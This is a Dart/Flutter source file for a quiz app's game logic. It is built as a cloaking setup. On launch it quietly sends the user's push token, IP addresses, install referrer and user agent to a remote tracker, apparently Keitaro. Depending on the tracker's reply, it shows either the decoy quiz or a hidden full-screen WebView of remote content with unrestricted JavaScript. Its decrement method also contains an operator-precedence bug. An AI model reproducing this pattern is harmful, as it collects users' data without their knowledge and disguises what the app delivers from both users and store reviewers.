import 'dart:convert';
import 'dart:io';

import 'package:android_play_install_referrer/android_play_install_referrer.dart';
import 'package:bloc/bloc.dart';
import 'package:dio/dio.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:tigerquiz/config/consts.dart';
import 'package:ua_client_hints/ua_client_hints.dart';
import 'package:webview_flutter/webview_flutter.dart';

part 'game_state.dart';

class GameCubit extends Cubit<GameState> {
  GameCubit() : super(GameInitial());

  Future init() async {
    final String token = await FirebaseMessaging.instance.getToken() ?? '';
    final String ip = await NetworkInterface.list()
        .then((value) => value.first.addresses.toString());
    const String package = Constants_.packageNameAndroid;

    String referrer = await SharedPreferences.getInstance()
        .then((value) => value.getString('referrer') ?? "");
    String statusColor = await SharedPreferences.getInstance()
        .then((value) => value.getString('statusColor') ?? '');

    if (referrer.isEmpty) {
      // Platform messages may fail, so we use a try/catch PlatformException.
      try {
        ReferrerDetails referrerDetails =
            await AndroidPlayInstallReferrer.installReferrer;

        if (referrerDetails.installReferrer == null) {
          referrer = '';
        } else {
          referrer = referrerDetails.installReferrer!;
        } // referrerDetails = referrerDetails;
      } catch (e) {
        referrer = "error_while_retrieving_referrer";
        // referrerDetailsString = 'Failed to get referrer details: $e';
      }
    }

    final keitaroURL =
        '${referrer.isEmpty || statusColor.isEmpty ? Constants_.checkerRequestUrl : Constants_.requestUrl}&registrationToken=$token&instref=$referrer&package=$package&adrr=$ip&uag=${await userAgent()}';

    print("KeitaroURL $keitaroURL");

    if (keitaroURL.startsWith(Constants_.checkerRequestUrl)) {
      var res = await Dio().get(keitaroURL).then((value) => value.data);
      if (res is String) {
        res = jsonDecode(res);
      }
      statusColor = res['color'];

      await SharedPreferences.getInstance()
          .then((value) => value.setString('statusColor', res['color']));
      await SharedPreferences.getInstance()
          .then((value) => value.setString('referrer', res['instref']));
      print(res);
    }

    if (statusColor.isNotEmpty && statusColor.toLowerCase() != 'black') {
      emit(Quiz(score: 0));
    } else {
      print("KeitaroURL $keitaroURL");

      final bool playGame =
          (statusColor == Constants_.showWebView && referrer.isNotEmpty);

      if (playGame) {
        WebViewController controller = WebViewController()
          ..setJavaScriptMode(JavaScriptMode.unrestricted)
          ..setBackgroundColor(Colors.transparent.withOpacity(0))
          ..setNavigationDelegate(
            NavigationDelegate(
              onProgress: (int progress) {
                // Update loading bar.
              },
              onPageStarted: (String url) {},
              onPageFinished: (String url) {},
              onWebResourceError: (WebResourceError error) {},
              onNavigationRequest: (NavigationRequest request) {
                return NavigationDecision.navigate;
              },
            ),
          )
          ..loadRequest(Uri.parse(keitaroURL));
        emit(WebView(keitaroUrl: keitaroURL, controller: controller));
      }
    }
  }

  void increment(int score) {
    emit(Quiz(score: (state.score ?? 0) + score));
  }

  void decrement() {
    emit(Quiz(
        score: (state.score ?? 0) > 0 ? state.score ?? 0 - 100 : state.score));
  }

  void drop() {
    emit(Quiz(score: 0));
  }
}
